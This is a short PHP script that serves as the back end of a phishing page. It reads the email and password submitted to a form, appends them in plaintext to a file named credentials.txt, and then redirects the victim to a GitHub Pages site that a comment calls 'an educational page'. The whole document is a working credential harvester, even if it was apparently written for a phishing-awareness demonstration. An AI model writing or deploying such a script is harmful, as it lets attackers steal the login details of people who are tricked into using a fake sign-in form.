<?php
// Get data from POST request
$email = $_POST['email'];
$password = $_POST['password'];

// Prepare data to save
$data = "Email: " . $email . " | Password: " . $password . "\n";

// Save data to a file
file_put_contents('credentials.txt', $data, FILE_APPEND);

// Redirect to an educational page
header('Location: https://jj3375.github.io/my_website/');
exit;
?>
